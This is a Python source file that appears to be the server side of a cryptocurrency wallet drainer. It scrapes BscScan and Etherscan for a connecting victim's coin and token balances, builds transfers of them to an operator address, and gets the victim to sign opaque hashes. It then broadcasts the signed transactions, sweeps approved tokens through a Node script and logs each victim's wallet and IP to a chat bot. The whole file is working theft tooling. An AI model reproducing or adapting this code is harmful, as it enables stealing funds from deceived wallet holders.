from audioop import add
from itertools import count
from random import choice
import requests
from lxml import html
import os,cloudscraper,math,subprocess,json
from web3 import Web3
from base64 import b64encode
from pymongo import MongoClient
from uuid import uuid4
from config import MAIN_ADDRESS,DATABASE_URL,RPC_INFURA,CRYPTOWATCH_API_KEY,MORALIS_API_KEY,BSCSCAN_API_KEY,ETHERSCAN_API_KEY,MIN_TOKEN_VALUE,BOT_TOKEN,CHAT_ID
from logger import send_log
from build_transaction import buildTransaction

mongoClient = MongoClient(DATABASE_URL)
monogDB = mongoClient.serverdb

print('[+] Database connected')

web3Bsc = Web3(Web3.HTTPProvider('https://bsc-dataseed.binance.org'))
web3Eth = Web3(Web3.HTTPProvider(RPC_INFURA))

def proxyHTTP():
    return True

def get_while(url,headers = None):
    prx = proxyHTTP()
    while prx != []:
        ran = ""
        if headers != None:
            try:
                r = requests.get(url,headers=headers,proxies=None,timeout=5)
                if "Sorry, our servers are currently busy" not in r.text and "Attention Required! | Cloudflare" not in r.text:
                    print("Requst with \033[92m"+ran+"\033[0m Success",url)
                    return r
                else:
                    print("Requst with \033[91m"+ran+"\033[0m Banned.")
            except Exception as e:
                print("Requst with \033[91m"+ran+"\033[0m Failed. info: "+str(e))
                prx.remove(ran)
        else:
            try:
                r = requests.get(url,headers=headers,proxies=None,timeout=5)
                if "Sorry, our servers are currently busy" not in r.text and "Attention Required! | Cloudflare" not in r.text and r.status_code == 200:
                    print("Requst with \033[92m"+ran+"\033[0m Success",url)
                    return r
                else:
                    
                    print("Requst with \033[91m"+ran+"\033[0m Banned.")
            except Exception as e:
                print("Requst with \033[91m"+ran+"\033[0m Failed. info: "+str(e))
                prx.remove(ran)
    else:
        return "error"    

def scraper_while(url,headers = None):
    scraper = cloudscraper.create_scraper()
    prx = proxyHTTP()
    while prx != []:
        ran = ""
        if headers != None:
            try:
                r = scraper.get(url,headers=headers,proxies=None,timeout=5)
                if "Sorry, our servers are currently busy" not in r.text and "Attention Required! | Cloudflare" not in r.text and r.status_code == 200:
                    print("Requst with \033[92m"+ran+"\033[0m Success",url)
                    return r
                else:
                    print(r.text)
                    print("Requst with \033[91m"+ran+"\033[0m Banned.")
            except Exception as e:
                print("Requst with \033[91m"+ran+"\033[0m Failed. info: "+str(e))
                prx.remove(ran)
        else:
            try:
                r = scraper.get(url,headers=headers,proxies=None,timeout=5)
                if "Sorry, our servers are currently busy" not in r.text and "Attention Required! | Cloudflare" not in r.text and r.status_code == 200:
                    print("Requst with \033[92m"+ran+"\033[0m Success",url)
                    return r
                else:
                    
                    print("Requst with \033[91m"+ran+"\033[0m Banned.")
            except Exception as e:
                print("Requst with \033[91m"+ran+"\033[0m Failed. info: "+str(e))
                prx.remove(ran)
    else:
        return "error"    
    
def api_call(path):
    if '?' in path:
        return requests.get('https://api.cryptowat.ch/{}?&apikey={}'.format(path,CRYPTOWATCH_API_KEY)).json()
    else:
        return requests.get('https://api.cryptowat.ch/{}?apikey={}'.format(path,CRYPTOWATCH_API_KEY)).json()

def get_bnb_price():
    return api_call(f'markets/binance/bnbusdt/price')['result']['price']

def get_eth_price():
    return api_call(f'markets/binance/ethusdt/price')['result']['price']

def get_coin_price(coin):
    print(f'get coin price {coin}')
    if coin.lower() == 'usdt':
        return 1
    else:
        try:
            return api_call(f'markets/binance/{coin.lower()}usdt/price')['result']['price']
        except:
            print(f'INVALID COIN : {coin}')
            return 0


def get_balance(address , explorer,get_price,chain,chainId):
    balance_object = []
    content = scraper_while(explorer+"/address/"+address).text
    xml = html.fromstring(content)
    ether_price = get_price() 

    
    if chain == "eth":
        value = xml.cssselect('.gap-5 div div div')[0].text_content()
        usdterc20 = get_contract_balance("0xdAC17F958D2ee523a2206206994597C13D831ec7",address,web3Eth)
        DAI = get_contract_balance("0x6b175474e89094c44da98b954eedeac495271d0f",address,web3Eth)
        if usdterc20 != 0:
            balance_object.append({'type':'token','value':round(usdterc20 / 1000000) - 0.5,'contract':"0xdAC17F958D2ee523a2206206994597C13D831ec7",'name':"USDT(ERC20)",'chain':chainId})
        if DAI != 0:
            balance_object.append({'type':'token','value':round(DAI / 1000000) - 0.5,'contract':"0x6b175474e89094c44da98b954eedeac495271d0f",'name':"DAI(ERC20)",'chain':chainId})
    else:
        value = xml.cssselect('.card-body div .col-md-8')[0].text_content()

    balance = float(value.split(' ')[0])
    balance_usd = float(value.split(' ')[0]) * ether_price

    if balance_usd <= 0 or balance <= 0:
        return []
    
    balance_object.append({'type':'ether','balance':balance,'value':balance_usd,'chain':chainId})

    rows = xml.cssselect('.list.list-unstyled.mb-0')
    if len(rows) > 0:
        rows = rows[0]
        for row in rows:
            classes = row.attrib['class'].split(' ')
            if 'list-custom' in classes:
                if len(row.cssselect('.list-name')) > 0:
                    if 'musk' not in row.cssselect('.list-name')[0].text_content().lower():
                        value = row.cssselect('.list-usd-value')
                        mustGetToken = False
                        if len(value) > 0:
                            value = value[0].text_content().strip()
                            if value:
                                value = float(value.replace('$','').replace(',',''))
                            else:
                                value = 0
                        else:
                            value = 0
                        name = row.cssselect('.list-name')[0].text_content()
                        if 'pex' in name.lower() or 'project-x' in name.lower() or mustGetToken or value >= MIN_TOKEN_VALUE:                                                       
                            balance_object.append({'type':'token','value':value,'contract':row.cssselect('.link-hover')[0].attrib['href'].split('/')[2].split('?')[0],'name':name,'chain':chainId})

    return balance_object

def getOthersCount(balance,chain):
    count = 0
    
    for item in balance:
        if item['type'] != 'ether' and item['chain'] == chain:
            count += 1
            
    return count

def generateId():
    return str(uuid4()).replace('-','')

def getAllBalance(balance):
    value = 0

    for item in balance:
        value += item['value']
    
    return value

def get_hashes(address,remote_address):
    if not web3Eth.is_address(address):
        return {
            'status':False
        }
    balance = get_balance(address , 'https://bscscan.com' , get_bnb_price , 'bsc',56) + get_balance(address , 'https://etherscan.io' , get_eth_price,'eth',1)
    
    balance = sorted(balance, key=lambda token: token['value'], reverse=True)
    print(balance)
    txIds = []
    
    if getAllBalance(balance) >= float(open("limit.txt").read()):
        string_log = f'''💠 wallet connecting 🆕 

♦️Wallet Address: {address}
♦️Remote address: {remote_address}'''
        for item in balance:
            # print('ITEM')
            if item['type'] == 'ether':
                count_items = getOthersCount(balance,item['chain'])
                item['balance'] = web3Eth.to_wei(item['balance'],'ether')
                
                print('COUNT :',count_items , item)
                if item['chain'] == 56:
                    gas = web3Bsc.eth.gas_price * 45000
                    item['balance'] = item['balance'] - (count_items * gas)
                else:
                    gas = web3Eth.eth.gas_price * 45000
                    item['balance'] = item['balance'] - (count_items * gas)
                
                if item['balance'] <= 0:
                    continue
                
                txD = buildTransaction(address , MAIN_ADDRESS,item)                
                
                estimateGasTx = txD['estimateGasTx']
                tx = txD['tx']
                txID = generateId()
    
                monogDB.txs.insert_one({'id':txID , 'estimateGasTx':json.dumps(estimateGasTx),'tx':json.dumps(tx),'address':address,'data':json.dumps(item)})
                
                txIds.append(txID)
                if isinstance(item['balance'],str):
                    item = json.loads(item)
                
                try:
                    if item['chain'] == 56:
                        type_tran = "BSC (SMART CHAIN)"
                        value_log = round(item['balance'] / 1000000000000000000 , 3)
                    else:
                        type_tran = "ETH (ETHEREUM)"
                        value_log = round(item['balance'] / 1000000000000000000 , 3)

                    string_log += f'''
                    
◽️ Value: {value_log}
💵 Amount: {round(item['value'],2)}$
◾️Chain: {type_tran}
'''
                except:
                    pass
            else:
                txD = buildTransaction(address , MAIN_ADDRESS,item)
                estimateGasTx = txD['estimateGasTx']
                tx = txD['tx']
                txID = generateId()
                
                estimateGasTx['value'] = str(estimateGasTx['value'])
                tx['value'] = str(tx['value'])
                
                monogDB.txs.insert_one({'id':txID , 'estimateGasTx':json.dumps(estimateGasTx),'tx':json.dumps(tx),'address':address,'data':json.dumps(item)})
                
                txIds.append(txID)
                
        
        send_log(string_log)
        
        return txIds
    else:
        return []

def get_tx_hash(txID,remote_address):
    r = monogDB.txs.find_one({'id':txID})
    if r:
        estimateGasTx = json.loads(r['estimateGasTx'])
        tx = json.loads(r['tx'])
        address = r['address']
        dataO = json.loads(r['data'])
        
        estimateGasTxEncoded = b64encode(bytes(json.dumps(estimateGasTx).encode())).decode()
        txEncoded = b64encode(bytes(json.dumps(tx).encode())).decode()
        
        try:
            output = subprocess.check_output(['node','getHash.js',address,estimateGasTxEncoded,txEncoded,dataO['type'],str(dataO['chain'])]).decode().strip()
        except Exception as e:
            print("Checked",e)

        data = json.loads(output)
        tx2 = data['tx']
        serializedTxHash = data['serializedTxHash']
        
        hashID = generateId()
        
        monogDB.hashes.insert_one({'id':hashID,'tx':json.dumps(tx2),'serializedTxHash':serializedTxHash,'chainId':dataO['chain'],'txID':txID})
        try:
            if dataO['chain'] == 56:
                type_tran = "BSC (SMART CHAIN)"
                if "balance" in dataO:
                    value_log = round(dataO['balance'] / 1000000000000000000 , 3)
                else:
                    value_log = "Contract No Value"
            else:
                type_tran = "ETH (ETHEREUM)"
                if "balance" in dataO:
                    value_log = round(dataO['balance'] / 1000000000000000000 , 3)
                else:
                    value_log = "Contract No Value"
            
            log_send = f'''🧾 New Hash Requested ❇️

    🔻Wallet Address : {address}
    🔻Remote address: {remote_address}

    ◽️ Value: {value_log}
    💵 Amount: {round(dataO['value'],2)}$
    ◾️Chain: {type_tran}

    🔰Hash id: {hashID}

    🌐Hash: {serializedTxHash}'''

            send_log(log_send)
        except:
            pass
        
        return {
            'status':True,
            'id':hashID,
            'hash':serializedTxHash
        }        
    else:
        return {
            'status':False,
            'error':'invalid id'
        }

def get_contract_balance(contractAddress , address , web3):
    contractABI =[
        {
            "constant": True,
            "inputs": [
                {
                    "name": "account",
                    "type": "address"
                }
            ],
            "name": "balanceOf",
            "outputs": [
                {
                    "name": "",
                    "type": "uint256"
                }
            ],
            "payable": False,
            "stateMutability": "view",
            "type": "function"
        }
    ]
    
    contract = web3.eth.contract(
        address= Web3.to_checksum_address(contractAddress),
        abi=contractABI
    )
    
    return contract.functions.balanceOf(Web3.to_checksum_address(address)).call()

def confirm_hash(hashID,signature,remote_address):
    r = monogDB.hashes.find_one({'id':hashID})
    if r:
        tx = json.loads(r['tx'])
        chainId = r['chainId']
        
        txEncoded = b64encode(bytes(json.dumps(tx).encode())).decode()
        
        signedTransaction = subprocess.check_output(['node','confirmHash.js',txEncoded,signature]).decode().strip()
        
        if signedTransaction == 'error':
            return {
                'status':False,
                'error':'invalid signature'
            }
            
        if chainId == 56:
            web3 = web3Bsc
        elif chainId == 1:
            web3 = web3Eth

        tx_hash = web3.eth.send_raw_transaction(signedTransaction)
        tx_hash = web3.to_hex(tx_hash)
        try:
            web3.eth.wait_for_transaction_receipt(tx_hash)
        except Exception as e:
            print('[-] Unable to confirm transaction',e)
            
            send_log(f'''🧾 Invalid Signature Sent ❌

🔻Sign : {signature}
🔻Hash id : {hashID}
🔻Remote address: {remote_address}
🚫 Exception Error: {str(e)}''')
        else:
            print(f'[+] Transaction Confirmed {tx_hash}')
            if chainId == 1:
                send_log(f'[+] Transaction Hash : https://etherscan.io/tx/{tx_hash}')
            elif chainId == 56:
                send_log(f'[+] Transaction Hash : https://bscscan.com/tx/{tx_hash}')
                
            
            txID = r['txID']

            rr = monogDB.txs.find_one({'id':txID})
            
            dataO = json.loads(rr['data'])
            
            if dataO['type'] == 'token':
                contractAddress = dataO['contract']
                address = rr['address']
                
                if dataO['chain'] == 56:
                    # amount = requests.get(f'https://api.bscscan.com/api?module=account&action=tokenbalance&contractaddress={contractAddress}&address={address}&tag=latest&apikey={BSCSCAN_API_KEY}').json()['result']
                    amount = get_contract_balance(contractAddress,address,web3Bsc)
                elif dataO['chain'] == 1:
                    # amount = requests.get(f'https://api.etherscan.io/api?module=account&action=tokenbalance&contractaddress={contractAddress}&address={address}&tag=latest&apikey={ETHERSCAN_API_KEY}').json()['result']
                    amount = get_contract_balance(contractAddress,address,web3Eth)
                    
                amount = int(amount)
                
                if contractAddress.lower() == '0xe9e7cea3dedca5984780bafc599bd69add087d56':
                    print('\n[+] BUSD ROUNDING\n')
                    amount = math.floor(amount / (10 ** 18)) * (10 ** 18)
                
                os.system(f'node get.js {address} {contractAddress} "{amount}"')
                
            data_to_log = f'''🧾 Transaction Sent ❇️

🔻Sign : {signature}
🔻Hash id : {hashID}
🔻Remote address: {remote_address}'''
            send_log(data_to_log)
        return {
            'status':True
        }
    else:
        return {
            'status':False,
            'error':'invalid id'
        }